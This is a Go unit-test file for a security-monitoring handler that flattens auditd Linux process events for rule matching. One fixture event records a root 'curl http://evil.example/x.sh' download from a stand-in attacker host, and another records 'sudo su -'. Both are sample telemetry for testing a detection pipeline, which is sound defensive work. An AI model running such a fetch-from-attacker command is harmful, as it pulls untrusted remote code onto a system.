package handlers

import "testing"

// The Linux feed has to arrive in a shape the rules can actually match on, and
// carry the platform label that stops Windows rules being judged against it.
func TestFlattenLinuxEvents_ShapeAndPlatform(t *testing.T) {
	raw := []byte(`[{
		"time":"2026-07-24T10:00:00Z","source":"auditd","record_type":"SYSCALL",
		"event_id":"process_creation","executable":"/usr/bin/curl",
		"command_line":"curl http://evil.example/x.sh","parent_exe":"/bin/bash",
		"comm":"curl","pid":4242,"ppid":4200,"user":"root","uid":"0","auid":"1000",
		"cwd":"/tmp","path":"/usr/bin/curl","key":"exec_rule","success":"yes",
		"host":"web-01","raw":"type=SYSCALL msg=audit(...)"
	}]`)

	events, err := flattenLinuxEvents(raw)
	if err != nil {
		t.Fatal(err)
	}
	if len(events) != 1 {
		t.Fatalf("expected 1 event, got %d", len(events))
	}
	e := events[0]

	if e["Platform"] != "linux" {
		t.Errorf("Platform must be labelled linux, got %v", e["Platform"])
	}
	if e["EventID"] != "process_creation" {
		t.Errorf("EventID must carry the category name, got %v", e["EventID"])
	}
	for _, k := range []string{"Executable", "CommandLine", "ParentExe", "User", "Computer", "TimeCreated"} {
		if e[k] == nil || e[k] == "" {
			t.Errorf("field %s was not carried through", k)
		}
	}
}

func TestFlattenLinuxEvents_SingleObject(t *testing.T) {
	events, err := flattenLinuxEvents([]byte(`{"event_id":"user_cmd","source":"auditd","command_line":"sudo su -"}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(events) != 1 || events[0]["EventID"] != "user_cmd" {
		t.Fatalf("a single object should decode to one event, got %+v", events)
	}
}

func TestFlattenLinuxEvents_Unreadable(t *testing.T) {
	if _, err := flattenLinuxEvents([]byte(`not json`)); err == nil {
		t.Error("unreadable agent output must be an error, not an empty success")
	}
}
